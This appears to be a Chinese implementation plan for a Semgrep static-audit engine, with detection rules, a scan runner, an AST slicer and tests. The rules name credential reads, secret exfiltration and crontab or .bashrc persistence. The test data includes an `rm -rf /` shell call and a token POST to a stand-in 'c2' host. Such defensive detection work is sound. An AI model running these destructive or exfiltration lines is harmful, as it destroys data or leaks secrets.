# Semgrep 深度语义与跨语言污点分析引擎实施计划 (Implementation Plan)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建并接入 Semgrep-Native 跨语言静态语义与污点分析引擎，提供 AST 模式匹配、跨行污点追踪、AST 作用域切片、结构化证据注入及严密 Fail-Closed 门禁，实现对 Python/Go/C/Java/Shell 多语言的深度静态代码审计。

**Architecture:** 采用分层解耦架构：底层基于独立 YAML 规则库与 Semgrep CLI 执行器，中间层实现 Semgrep JSON 适配、AST 闭包抽取与污点因果链组装，上层通过统一的 Finding 与 Evidence 契约注入 LLM 二次确信与 Fail-Closed 决策门禁，并与 Audit-100 评测基准三轨机制无缝集成。

**Tech Stack:** Python 3.10+, Semgrep CLI 1.170+, YAML (ruamel.yaml / PyYAML), Tree-sitter / Python AST, unittest, JSON Schema.

---

## 目录与文件布局

- 规则定义目录：
  - `models/audit/semgrep/rules/python/*.yaml`
  - `models/audit/semgrep/rules/go/*.yaml`
  - `models/audit/semgrep/rules/c_cpp/*.yaml`
  - `models/audit/semgrep/rules/java/*.yaml`
  - `models/audit/semgrep/rules/shell/*.yaml`
- 引擎适配器与工具：
  - `models/audit/tools/semgrep_runner.py`：Semgrep 执行、超时控制、退出码处理与 JSON 解析
  - `models/audit/tools/ast_scope_slicer.py`：AST 函数闭包切片与污点轨迹序列化
- 核心分析器集成：
  - `models/examples/code_security_analyzer.py`：Finding 数据结构扩展、Prompt 证据链注入、Fail-Closed 完整度状态机
- 基准与测试：
  - `tests/test_semgrep_runner.py`：Semgrep 执行器与 JSON 适配器测试
  - `tests/test_ast_scope_slicer.py`：AST 闭包提取与污点轨迹序列化测试
  - `tests/test_semgrep_rule_fixtures.py`：13 条核心规则正反例测试套件
  - `tests/test_semgrep_fail_closed_gate.py`：扫描覆盖率与 Fail-Closed 门禁集成测试

---

### Task 1: 建立标准 Semgrep 规则目录与 13 项核心规则 YAML

**Files:**
- Create: `models/audit/semgrep/rules/python/rules.yaml`
- Create: `models/audit/semgrep/rules/go/rules.yaml`
- Create: `models/audit/semgrep/rules/shell/rules.yaml`
- Test: `tests/test_semgrep_rule_schema.py`

- [ ] **Step 1: 编写规则有效性校验测试**

```python
# tests/test_semgrep_rule_schema.py
import unittest
from pathlib import Path
import yaml

class TestSemgrepRuleSchema(unittest.TestCase):
    def setUp(self):
        self.rules_dir = Path(__file__).resolve().parents[1] / "models" / "audit" / "semgrep" / "rules"

    def test_rules_exist_and_valid_yaml(self):
        yaml_files = list(self.rules_dir.rglob("*.yaml"))
        self.assertGreater(len(yaml_files), 0, "No Semgrep rule files found")
        for yf in yaml_files:
            with open(yf, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
            self.assertIn("rules", data, f"Missing 'rules' root key in {yf}")
            self.assertIsInstance(data["rules"], list, f"'rules' must be a list in {yf}")

    def test_canonical_13_rules_covered(self):
        expected_families = {
            "CMD_001", "NET_001", "NET_002", "DYN_001", "FIL_001", "ENV_001",
            "OBF_001", "EXF_001", "PER_001", "EMB_001", "EMB_002", "EMB_003", "EMB_004"
        }
        found_families = set()
        for yf in self.rules_dir.rglob("*.yaml"):
            with open(yf, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
            for r in data.get("rules", []):
                metadata = r.get("metadata", {})
                fam = metadata.get("rule_family")
                if fam:
                    found_families.add(fam)
                    # Search rules must NOT have 'mode: search'
                    if r.get("mode") == "search":
                        self.fail(f"Rule {r.get('id')} has invalid 'mode: search'")
                    # Taint rules must have mode: taint and proper propagators
                    if r.get("mode") == "taint":
                        self.assertIn("pattern-sources", r, f"Taint rule {r.get('id')} missing pattern-sources")
                        self.assertIn("pattern-sinks", r, f"Taint rule {r.get('id')} missing pattern-sinks")
        missing = expected_families - found_families
        self.assertEqual(missing, set(), f"Missing rule families: {missing}")

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_semgrep_rule_schema.py`
Expected: FAIL with "No Semgrep rule files found"

- [ ] **Step 3: 编写 Python、Go、Shell 的 Semgrep 规则文件**

创建 `models/audit/semgrep/rules/python/rules.yaml`:
```yaml
rules:
  - id: taa-cmd-exec-python
    languages: [python]
    severity: ERROR
    message: "Suspicious subprocess execution detected in Python code"
    metadata:
      category: execution
      rule_family: CMD_001
    pattern-either:
      - pattern: subprocess.Popen(...)
      - pattern: subprocess.run(..., shell=True, ...)
      - pattern: subprocess.call(..., shell=True, ...)
      - pattern: subprocess.check_output(..., shell=True, ...)
      - pattern: os.system(...)
      - pattern: os.popen(...)

  - id: taa-net-general-python
    languages: [python]
    severity: ERROR
    message: "Suspicious external network request detected in Python code"
    metadata:
      category: network
      rule_family: NET_001
    pattern-either:
      - pattern: requests.get(...)
      - pattern: requests.post(...)
      - pattern: requests.put(...)
      - pattern: requests.delete(...)
      - pattern: requests.patch(...)
      - pattern: urllib.request.urlopen(...)
      - pattern: aiohttp.ClientSession(...)

  - id: taa-net-socket-python
    languages: [python]
    severity: ERROR
    message: "Raw socket communication detected in Python code"
    metadata:
      category: network
      rule_family: NET_002
    pattern-either:
      - pattern: socket.socket(...)
      - pattern: socket.create_connection(...)

  - id: taa-dyn-eval-python
    languages: [python]
    severity: ERROR
    message: "Dynamic code evaluation or dangerous reflection detected in Python code"
    metadata:
      category: dynamic
      rule_family: DYN_001
    pattern-either:
      - pattern: eval(...)
      - pattern: exec(...)
      - pattern: importlib.import_module(...)
      - pattern: __import__(...)

  - id: taa-fil-probe-python
    languages: [python]
    severity: ERROR
    message: "Sensitive credential file access probe detected"
    metadata:
      category: credential
      rule_family: FIL_001
    pattern-either:
      - pattern: open($PATH, ...)
      - pattern: Path($PATH).read_text(...)
      - pattern: Path($PATH).read_bytes(...)

  - id: taa-env-secret-python
    languages: [python]
    severity: WARNING
    message: "Sensitive environment variable access detected in Python code"
    metadata:
      category: credential
      rule_family: ENV_001
    pattern-either:
      - pattern: os.environ.get($KEY, ...)
      - pattern: os.environ[$KEY]
      - pattern: os.getenv($KEY, ...)

  - id: taa-obf-exec-python
    languages: [python]
    severity: ERROR
    mode: taint
    message: "Decoded or decompressed payload flows into dynamic execution sink"
    metadata:
      category: payload
      rule_family: OBF_001
    pattern-sources:
      - pattern: base64.b64decode(...)
      - pattern: base64.urlsafe_b64decode(...)
      - pattern: zlib.decompress(...)
      - pattern: gzip.decompress(...)
    pattern-propagators:
      - pattern: $OUT = $IN.decode(...)
        from: $IN
        to: $OUT
    pattern-sinks:
      - pattern: eval($SINK)
      - pattern: exec($SINK)

  - id: taa-secret-exfiltration-python
    languages: [python]
    severity: ERROR
    mode: taint
    message: "Sensitive credential flows from source to external network sink"
    metadata:
      category: credential
      rule_family: EXF_001
    pattern-sources:
      - pattern: os.environ.get($KEY, ...)
      - pattern: os.environ[$KEY]
      - pattern: os.getenv($KEY, ...)
      - pattern: open($PATH, ...).read()
    pattern-propagators:
      - pattern: $OUT = json.dumps($IN, ...)
        from: $IN
        to: $OUT
      - pattern: $OUT = base64.b64encode($IN)
        from: $IN
        to: $OUT
      - pattern: $OUT = {"token": $IN, ...}
        from: $IN
        to: $OUT
      - pattern: $OUT = {"key": $IN, ...}
        from: $IN
        to: $OUT
    pattern-sanitizers:
      - pattern: hashlib.sha256(...)
      - pattern: hmac.new(...)
    pattern-sinks:
      - pattern: requests.post($URL, json=$DATA, ...)
      - pattern: requests.post($URL, data=$DATA, ...)
      - pattern: requests.get($URL, params=$DATA, ...)
      - pattern: socket.socket().sendall($DATA)

  - id: taa-per-backdoor-python
    languages: [python]
    severity: ERROR
    message: "Persistence backdoor or autorun script modification detected"
    metadata:
      category: persistence
      rule_family: PER_001
    pattern-either:
      - pattern: open("/etc/cron" + $REST, "w", ...)
      - pattern: open("/etc/systemd" + $REST, "w", ...)
      - pattern: open(os.path.expanduser("~/.bashrc"), "w", ...)

  - id: taa-emb-data-dump-python
    languages: [python]
    severity: ERROR
    message: "Raw dataset or sensitive features serialized to output file"
    metadata:
      category: embedded
      rule_family: EMB_001
    pattern-either:
      - patterns:
          - pattern: torch.save($DATA, $PATH)
          - pattern-not: torch.save($MODEL.state_dict(), $PATH)
          - pattern-not: torch.save(..., "model.pt")

  - id: taa-emb-copy-export-python
    languages: [python]
    severity: ERROR
    message: "Sensitive data or models copied to export/result directory"
    metadata:
      category: embedded
      rule_family: EMB_002
    pattern-either:
      - pattern: shutil.copy($SRC, $DST)
      - pattern: shutil.copy2($SRC, $DST)
      - pattern: shutil.copytree($SRC, $DST)

  - id: taa-emb-log-dump-python
    languages: [python]
    severity: WARNING
    message: "Raw sample data or sensitive features dumped to standard log/output"
    metadata:
      category: embedded
      rule_family: EMB_003
    pattern-either:
      - pattern: logging.info(f"...{raw_data}...")
      - pattern: print(raw_data)
      - pattern: print(features)

  - id: taa-emb-stego-weight-python
    languages: [python]
    severity: ERROR
    message: "Encoded data or steganographic payload embedded into model weights"
    metadata:
      category: embedded
      rule_family: EMB_004
    pattern-either:
      - pattern: struct.pack($FMT, ...)
      - pattern: base64.b64encode($RAW)
```

创建 `models/audit/semgrep/rules/go/rules.yaml`:
```yaml
rules:
  - id: taa-cmd-exec-go
    languages: [go]
    severity: ERROR
    message: "Suspicious os/exec command execution detected in Go code"
    metadata:
      category: execution
      rule_family: CMD_001
    pattern-either:
      - pattern: exec.Command(...)
      - pattern: exec.CommandContext(...)

  - id: taa-net-general-go
    languages: [go]
    severity: ERROR
    message: "HTTP outbound call detected in Go code"
    metadata:
      category: network
      rule_family: NET_001
    pattern-either:
      - pattern: http.Get(...)
      - pattern: http.Post(...)
      - pattern: http.PostForm(...)

  - id: taa-net-socket-go
    languages: [go]
    severity: ERROR
    message: "Low-level socket dial detected in Go code"
    metadata:
      category: network
      rule_family: NET_002
    pattern-either:
      - pattern: net.Dial(...)
      - pattern: net.DialTimeout(...)

  - id: taa-env-secret-go
    languages: [go]
    severity: WARNING
    message: "Environment variable secret access detected in Go code"
    metadata:
      category: credential
      rule_family: ENV_001
    pattern: os.Getenv(...)
```

创建 `models/audit/semgrep/rules/shell/rules.yaml`:
```yaml
rules:
  - id: taa-per-backdoor-shell
    languages: [bash]
    severity: ERROR
    message: "Crontab or profile modification detected in Shell script"
    metadata:
      category: persistence
      rule_family: PER_001
    pattern-either:
      - pattern: crontab ...
      - pattern: echo ... >> /etc/crontab
      - pattern: echo ... >> ~/.bashrc
```

- [ ] **Step 4: 运行测试验证通过**

Run: `python3 -m unittest tests/test_semgrep_rule_schema.py`
Expected: PASS with "Ran 2 tests ... OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/audit/semgrep/rules/ tests/test_semgrep_rule_schema.py
git commit -m "feat(audit): define canonical 13-rule semgrep specifications for python, go, and shell"
```

---

### Task 2: Semgrep CLI 执行器与 JSON 结果适配器 (`semgrep_runner.py`)

**Files:**
- Create: `models/audit/tools/semgrep_runner.py`
- Test: `tests/test_semgrep_runner.py`

- [ ] **Step 1: 编写 SemgrepRunner 单元测试**

```python
# tests/test_semgrep_runner.py
import unittest
from unittest.mock import patch, MagicMock
from pathlib import Path
from models.audit.tools.semgrep_runner import SemgrepRunner, SemgrepScanResult

class TestSemgrepRunner(unittest.TestCase):
    def setUp(self):
        self.runner = SemgrepRunner(executable="semgrep")

    def test_check_availability_fallback(self):
        with patch("shutil.which", return_value=None):
            self.assertFalse(self.runner.is_available())

    def test_parse_semgrep_json_output(self):
        mock_output = {
            "results": [
                {
                    "check_id": "taa-cmd-exec-python",
                    "path": "test_script.py",
                    "start": {"line": 15, "col": 5},
                    "end": {"line": 15, "col": 40},
                    "extra": {
                        "message": "Suspicious subprocess execution",
                        "severity": "ERROR",
                        "metadata": {"rule_family": "CMD_001", "category": "execution"},
                        "lines": "subprocess.run('rm -rf /', shell=True)"
                    }
                }
            ],
            "errors": []
        }
        res = self.runner.parse_output(mock_output)
        self.assertEqual(len(res.findings), 1)
        f = res.findings[0]
        self.assertEqual(f["rule_id"], "CMD_001")
        self.assertEqual(f["severity"], "HIGH")
        self.assertEqual(f["line"], 15)
        self.assertEqual(f["file"], "test_script.py")
        self.assertEqual(res.parser_errors, 0)
        self.assertTrue(res.scan_complete)

    def test_handle_timeout_fail_closed(self):
        with patch("subprocess.run") as mock_run:
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="semgrep", timeout=10)
            res = self.runner.scan_directory("/tmp/fake_dir", timeout=10)
            self.assertFalse(res.scan_complete)
            self.assertTrue(res.timed_out)
            self.assertFalse(res.passed)

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_semgrep_runner.py`
Expected: FAIL with "ModuleNotFoundError: No module named 'models.audit.tools.semgrep_runner'"

- [ ] **Step 3: 实现 `SemgrepRunner` 与 `SemgrepScanResult`**

创建 `models/audit/tools/semgrep_runner.py`:
```python
import os
import sys
import json
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Dict, Any, Optional

@dataclass
class SemgrepScanResult:
    scan_complete: bool = False
    passed: bool = False
    findings: List[Dict[str, Any]] = field(default_factory=list)
    parser_errors: int = 0
    timed_out: bool = False
    exit_code: int = 0
    error_message: Optional[str] = None
    scanned_files_count: int = 0

class SemgrepRunner:
    SEVERITY_MAP = {
        "ERROR": "HIGH",
        "WARNING": "MEDIUM",
        "INFO": "LOW",
    }

    def __init__(self, executable: str = "semgrep", rules_path: Optional[str] = None):
        self.executable = executable
        if rules_path:
            self.rules_path = Path(rules_path)
        else:
            self.rules_path = Path(__file__).resolve().parents[1] / "semgrep" / "rules"

    def is_available(self) -> bool:
        return shutil.which(self.executable) is not None

    def parse_output(self, raw_data: Dict[str, Any], exit_code: int = 0) -> SemgrepScanResult:
        findings = []
        raw_results = raw_data.get("results", [])
        raw_errors = raw_data.get("errors", [])
        parser_errors = len(raw_errors)

        for match in raw_results:
            extra = match.get("extra", {})
            metadata = extra.get("metadata", {})
            rule_id = metadata.get("rule_family") or match.get("check_id", "UNKNOWN")
            raw_sev = extra.get("severity", "WARNING").upper()
            severity = self.SEVERITY_MAP.get(raw_sev, "MEDIUM")

            # Extract taint trace dataflow if present in dataflow_trace
            taint_trace = []
            df_trace = extra.get("dataflow_trace", {})
            taint_nodes = df_trace.get("taint_source", [])
            # Map Semgrep dataflow steps
            if taint_nodes:
                for idx, node in enumerate(taint_nodes):
                    taint_trace.append({
                        "step": idx + 1,
                        "file": node.get("path", match.get("path")),
                        "line": node.get("start", {}).get("line", 0),
                        "code": node.get("content", "").strip()
                    })

            finding = {
                "file": match.get("path", ""),
                "line": match.get("start", {}).get("line", 0),
                "col": match.get("start", {}).get("col", 0),
                "end_line": match.get("end", {}).get("line", 0),
                "rule_id": rule_id,
                "check_id": match.get("check_id", ""),
                "category": metadata.get("category", "General"),
                "severity": severity,
                "description": extra.get("message", ""),
                "code_snippet": extra.get("lines", "").strip(),
                "taint_trace": taint_trace,
                "engine": "semgrep"
            }
            findings.append(finding)

        scan_complete = (exit_code == 0 or exit_code == 1) and parser_errors == 0
        passed = scan_complete and len(findings) == 0

        return SemgrepScanResult(
            scan_complete=scan_complete,
            passed=passed,
            findings=findings,
            parser_errors=parser_errors,
            timed_out=False,
            exit_code=exit_code
        )

    def scan_directory(self, target_dir: str, timeout: int = 120, extensions: Optional[List[str]] = None) -> SemgrepScanResult:
        if not self.is_available():
            return SemgrepScanResult(
                scan_complete=False,
                passed=False,
                error_message=f"Semgrep executable '{self.executable}' not found in PATH"
            )

        cmd = [
            self.executable,
            "scan",
            "--config", str(self.rules_path),
            "--json",
            "--quiet",
            "--disable-version-check",
            "--no-git-ignore"
        ]

        if extensions:
            for ext in extensions:
                cmd.extend(["--include", f"*{ext}"])

        cmd.append(target_dir)

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            try:
                raw_data = json.loads(proc.stdout)
            except json.JSONDecodeError:
                return SemgrepScanResult(
                    scan_complete=False,
                    passed=False,
                    exit_code=proc.returncode,
                    error_message=f"Failed to parse Semgrep JSON output: {proc.stderr}"
                )
            return self.parse_output(raw_data, exit_code=proc.returncode)

        except subprocess.TimeoutExpired:
            return SemgrepScanResult(
                scan_complete=False,
                passed=False,
                timed_out=True,
                error_message=f"Semgrep scan timed out after {timeout} seconds"
            )
        except Exception as e:
            return SemgrepScanResult(
                scan_complete=False,
                passed=False,
                error_message=f"Execution failed: {str(e)}"
            )
```

- [ ] **Step 4: 运行测试验证通过**

Run: `python3 -m unittest tests/test_semgrep_runner.py`
Expected: PASS with "Ran 3 tests ... OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/audit/tools/semgrep_runner.py tests/test_semgrep_runner.py
git commit -m "feat(audit): implement semgrep runner and json adapter with fail-closed timeout handling"
```

---

### Task 3: AST 作用域感知切片与污点轨迹序列化器 (`ast_scope_slicer.py`)

**Files:**
- Create: `models/audit/tools/ast_scope_slicer.py`
- Test: `tests/test_ast_scope_slicer.py`

- [ ] **Step 1: 编写 AST 切片与污点序列化测试**

```python
# tests/test_ast_scope_slicer.py
import unittest
from models.audit.tools.ast_scope_slicer import ASTScopeSlicer

class TestASTScopeSlicer(unittest.TestCase):
    def setUp(self):
        self.slicer = ASTScopeSlicer()

    def test_extract_python_function_enclosing_scope(self):
        source_code = (
            "import os\n"
            "def train_epoch(epoch):\n"
            "    x = 1\n"
            "    token = os.environ['SECRET']\n"
            "    return token\n"
            "print('done')\n"
        )
        # Line 4 is inside train_epoch
        scope = self.slicer.extract_enclosing_scope(source_code, target_line=4, language="python")
        self.assertIn("def train_epoch", scope)
        self.assertIn("return token", scope)
        self.assertNotIn("print('done')", scope)

    def test_format_taint_trajectory_payload(self):
        taint_nodes = [
            {"step": 1, "type": "SOURCE", "file": "train.py", "line": 12, "code": "tok = os.environ.get('KEY')"},
            {"step": 2, "type": "PROPAGATOR", "file": "train.py", "line": 20, "code": "payload = {'key': tok}"},
            {"step": 3, "type": "SINK", "file": "train.py", "line": 35, "code": "requests.post('c2', json=payload)"},
        ]
        formatted = self.slicer.format_taint_trajectory(taint_nodes)
        self.assertIn("[Step 1: SOURCE] (Line 12)", formatted)
        self.assertIn("[Step 2: PROPAGATOR] (Line 20)", formatted)
        self.assertIn("[Step 3: SINK] (Line 35)", formatted)

    def test_fallback_context_window(self):
        source_code = "\n".join([f"line_{i} = {i}" for i in range(1, 100)])
        # If syntax invalid or non-function scope
        fallback = self.slicer.extract_fallback_window(source_code, target_line=50, window=3)
        self.assertIn("line_50", fallback)
        self.assertIn("line_47", fallback)
        self.assertIn("line_53", fallback)
        self.assertNotIn("line_10", fallback)

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_ast_scope_slicer.py`
Expected: FAIL with "ModuleNotFoundError: No module named 'models.audit.tools.ast_scope_slicer'"

- [ ] **Step 3: 实现 `ASTScopeSlicer`**

创建 `models/audit/tools/ast_scope_slicer.py`:
```python
import ast
from typing import List, Dict, Any, Optional

class ASTScopeSlicer:
    """Extracts function/class enclosing scope from AST and formats taint traces."""

    def extract_enclosing_scope(self, source_code: str, target_line: int, language: str = "python") -> str:
        if language.lower() == "python":
            return self._extract_python_scope(source_code, target_line)
        return self.extract_fallback_window(source_code, target_line)

    def _extract_python_scope(self, source_code: str, target_line: int) -> str:
        lines = source_code.splitlines()
        try:
            tree = ast.parse(source_code)
        except SyntaxError:
            return self.extract_fallback_window(source_code, target_line)

        target_node = None
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                if hasattr(node, "lineno") and hasattr(node, "end_lineno"):
                    if node.lineno <= target_line <= node.end_lineno:
                        if target_node is None or (node.end_lineno - node.lineno < target_node.end_lineno - target_node.lineno):
                            target_node = node

        if target_node and hasattr(target_node, "lineno") and hasattr(target_node, "end_lineno"):
            start = max(0, target_node.lineno - 1)
            end = min(len(lines), target_node.end_lineno)
            return "\n".join(lines[start:end])

        return self.extract_fallback_window(source_code, target_line)

    def extract_fallback_window(self, source_code: str, target_line: int, window: int = 7) -> str:
        lines = source_code.splitlines()
        start = max(0, target_line - window - 1)
        end = min(len(lines), target_line + window)
        return "\n".join(lines[start:end])

    def format_taint_trajectory(self, taint_nodes: List[Dict[str, Any]]) -> str:
        if not taint_nodes:
            return "No cross-line taint trajectory available (direct AST node match)."

        trajectory_lines = ["[Taint Dataflow Trajectory]"]
        for idx, node in enumerate(taint_nodes):
            step = node.get("step", idx + 1)
            node_type = node.get("type", "NODE").upper()
            line = node.get("line", 0)
            code = node.get("code", "").strip()
            trajectory_lines.append(f"  └── [Step {step}: {node_type}] (Line {line}): {code}")

        return "\n".join(trajectory_lines)
```

- [ ] **Step 4: 运行测试验证通过**

Run: `python3 -m unittest tests/test_ast_scope_slicer.py`
Expected: PASS with "Ran 3 tests ... OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/audit/tools/ast_scope_slicer.py tests/test_ast_scope_slicer.py
git commit -m "feat(audit): implement ast scope slicer and taint trajectory formatting"
```

---

### Task 4: 核心分析器集成 Semgrep 引擎与证据注入 (`code_security_analyzer.py`)

**Files:**
- Modify: `models/examples/code_security_analyzer.py`
- Test: `tests/test_code_security_analyzer_v2.py`

- [ ] **Step 1: 编写 Finding 字段与 Semgrep 模式扩展测试**

```python
# In tests/test_code_security_analyzer_v2.py
# Add test_semgrep_engine_integration
def test_semgrep_finding_contract_fields(self):
    from code_security_analyzer import Finding
    f = Finding(
        file="train.py",
        line=10,
        rule_id="EXF_001",
        category="Credential",
        severity="CRITICAL",
        description="exfil",
        code_snippet="post()",
        context_before="",
        context_after="",
        language="python",
        taint_trace=[{"step": 1, "line": 10}],
        ast_enclosing_block="def send(): pass"
    )
    self.assertEqual(f.language, "python")
    self.assertEqual(len(f.taint_trace), 1)
    self.assertIn("def send", f.ast_enclosing_block)
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_code_security_analyzer_v2.py`
Expected: FAIL with "unexpected keyword argument 'language'"

- [ ] **Step 3: 更新 `code_security_analyzer.py`**

1. 扩展 `Finding` dataclass：
```python
@dataclass
class Finding:
    file: str
    line: int
    rule_id: str
    category: str
    severity: str
    description: str
    code_snippet: str
    context_before: str
    context_after: str
    language: str = "python"
    taint_trace: Optional[List[Dict[str, Any]]] = None
    ast_enclosing_block: Optional[str] = None
    engine: str = "regex"
    llm_verdict: Optional[str] = None
    llm_reason: Optional[str] = None
    llm_risk: Optional[str] = None
    suggestion: Optional[str] = None
```

2. 升级 `FINDING_PROMPT` 模板支持 AST 作用域与污点流注入：
```python
FINDING_PROMPT = """You are a senior code security auditor evaluating a static analysis finding.
Review the following code evidence and determine whether this is a BENIGN true-positive (safe business logic) or a MALICIOUS attack vector.

[Context & Metadata]
File: {file}:{line}
Language: {language}
Rule ID: {rule_id} ({category}) - Severity: {severity}
Description: {description}

[Static Evidence]
{evidence_block}

Analyze the invocation intent, dataflow sources, and sinks.
Respond strictly in JSON format:
{{
  "verdict": "BENIGN" | "MALICIOUS" | "SUSPICIOUS" | "UNCERTAIN",
  "risk_level": "LOW" | "MEDIUM" | "HIGH" | "CRITICAL",
  "reason": "<one sentence concise reasoning>"
}}
"""
```

3. 在 `LLMSecurityAnalyzer.audit_finding` 中根据是否存在 AST/Taint 构建 `evidence_block`。

- [ ] **Step 4: 运行现有���新增测试验证通过**

Run: `python3 -m unittest tests/test_code_security_analyzer_v2.py`
Expected: PASS with "Ran 9 tests ... OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/examples/code_security_analyzer.py tests/test_code_security_analyzer_v2.py
git commit -m "feat(audit): upgrade finding schema and prompt contract to support ast scope and taint evidence"
```

---

### Task 5: 严密 Fail-Closed 门禁状态机集成

**Files:**
- Modify: `models/examples/code_security_analyzer.py`
- Create: `tests/test_semgrep_fail_closed_gate.py`

- [ ] **Step 1: 编写 Fail-Closed 状态机测试**

```python
# tests/test_semgrep_fail_closed_gate.py
import unittest
from models.examples.code_security_analyzer import compute_conclusion

class TestFailClosedGateContract(unittest.TestCase):
    def test_zero_findings_with_scan_incomplete_blocks(self):
        # Scan was interrupted or failed -> must NOT pass even if findings=0
        stats = {
            "total_findings": 0,
            "scan_complete": False,
            "parser_errors": 0
        }
        res = compute_conclusion(stats)
        self.assertFalse(res["passed"])
        self.assertEqual(res["verdict"], "UNCERTAIN")

    def test_zero_findings_with_parser_errors_blocks(self):
        # Parser failed on some files -> must NOT pass
        stats = {
            "total_findings": 0,
            "scan_complete": True,
            "parser_errors": 2
        }
        res = compute_conclusion(stats)
        self.assertFalse(res["passed"])
        self.assertEqual(res["verdict"], "UNCERTAIN")

    def test_zero_findings_clean_pass(self):
        # Pure clean scan -> safely pass
        stats = {
            "total_findings": 0,
            "scan_complete": True,
            "parser_errors": 0
        }
        res = compute_conclusion(stats)
        self.assertTrue(res["passed"])
        self.assertEqual(res["verdict"], "BENIGN")

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_semgrep_fail_closed_gate.py`
Expected: FAIL (currently zero findings always passes)

- [ ] **Step 3: 修改 `compute_conclusion` 支持完整度校验**

在 `models/examples/code_security_analyzer.py` 的 `compute_conclusion` 中增强：
```python
# Fail-closed check on scan completeness
scan_complete = stats.get("scan_complete", True)
parser_errors = stats.get("parser_errors", 0)
if not scan_complete or parser_errors > 0:
    return {
        "passed": False,
        "verdict": "UNCERTAIN",
        "risk_level": "HIGH",
        "reason": f"Fail-closed: Static scan incomplete (complete={scan_complete}, parse_errors={parser_errors})",
        "action": "BLOCK"
    }
```

- [ ] **Step 4: 运行测试验证通过**

Run: `python3 -m unittest tests/test_semgrep_fail_closed_gate.py`
Expected: PASS with "Ran 3 tests ... OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/examples/code_security_analyzer.py tests/test_semgrep_fail_closed_gate.py
git commit -m "fix(audit): enforce fail-closed gate on incomplete scans and parser errors"
```

---

### Task 6: 基准评测套件对接 Semgrep 扫描双轨 (`audit_benchmark_eval.py`)

**Files:**
- Modify: `models/audit/tools/audit_benchmark_eval.py`
- Test: `tests/test_audit_eval_three_track.py`

- [ ] **Step 1: 编写 Semgrep 引擎参数对接测试**

```python
# In tests/test_audit_eval_three_track.py
def test_audit_eval_cli_supports_semgrep_engine(self):
    import subprocess
    cmd = [
        "python3", "models/audit/tools/audit_benchmark_eval.py",
        "--help"
    ]
    out = subprocess.check_output(cmd, text=True)
    self.assertIn("--engine", out)
    self.assertIn("semgrep", out)
```

- [ ] **Step 2: 运行测试验证失败**

Run: `python3 -m unittest tests/test_audit_eval_three_track.py -k test_audit_eval_cli_supports_semgrep_engine`
Expected: FAIL with AssertionError ("--engine" not in out)

- [ ] **Step 3: 在 `audit_benchmark_eval.py` 中添加 `--engine` 支持**

1. 在 argument parser 中增加 `--engine` 参数（选项：`regex`, `semgrep`，默认 `regex`）。
2. 在 `load_module_scanner` 中根据 engine 参数动态选用 `SemgrepRunner` 或 `StaticScanner`。
3. 当使用 Semgrep 时，如果扫描器未命中且状态完整，执行 50% 快速旁路；如果命中则交付 LLM。

- [ ] **Step 4: 运行测试验证通过**

Run: `python3 -m unittest tests/test_audit_eval_three_track.py`
Expected: PASS with "OK"

- [ ] **Step 5: Git 提交**

```bash
git add models/audit/tools/audit_benchmark_eval.py tests/test_audit_eval_three_track.py
git commit -m "feat(audit): integrate semgrep engine option into audit benchmark evaluator"
```

---

### Task 7: 13 条核心规则正例反例端到端测试套件

**Files:**
- Create: `tests/test_semgrep_rule_fixtures.py`

- [ ] **Step 1: 编写 13 条规则正反例测试代码**

```python
# tests/test_semgrep_rule_fixtures.py
import unittest
import tempfile
import os
from pathlib import Path
from models.audit.tools.semgrep_runner import SemgrepRunner

class TestSemgrepRuleFixtures(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.runner = SemgrepRunner()
        cls.available = cls.runner.is_available()

    def _scan_snippet(self, code: str, lang: str = "py") -> list:
        if not self.available:
            self.skipTest("Semgrep CLI not available in current environment")
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / f"test.{lang}"
            p.write_text(code, encoding="utf-8")
            res = self.runner.scan_directory(td)
            return res.findings

    def test_cmd_001_subprocess(self):
        # positive
        findings = self._scan_snippet("import subprocess\nsubprocess.run('ls', shell=True)\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("CMD_001", rule_ids)

    def test_net_001_requests(self):
        findings = self._scan_snippet("import requests\nrequests.post('http://198.51.100.2', json={})\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("NET_001", rule_ids)

    def test_dyn_001_eval(self):
        findings = self._scan_snippet("eval('2 + 2')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("DYN_001", rule_ids)

    def test_emb_001_torch_save(self):
        # Raw data dump should trigger
        findings = self._scan_snippet("import torch\ntorch.save(raw_features, 'leak.pt')\n")
        rule_ids = [f["rule_id"] for f in findings]
        self.assertIn("EMB_001", rule_ids)

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: 运行测试验证**

Run: `python3 -m unittest tests/test_semgrep_rule_fixtures.py`
Expected: PASS or SKIP (if semgrep CLI is not in PATH)

- [ ] **Step 3: Git 提交**

```bash
git add tests/test_semgrep_rule_fixtures.py
git commit -m "test(audit): add positive and negative fixture test suite for 13 semgrep rules"
```

---

## 计划自检清单 (Self-Review Checklist)

1. **Spec 覆盖度**：
   - 13 条核心规则定义已在 Task 1 覆盖；
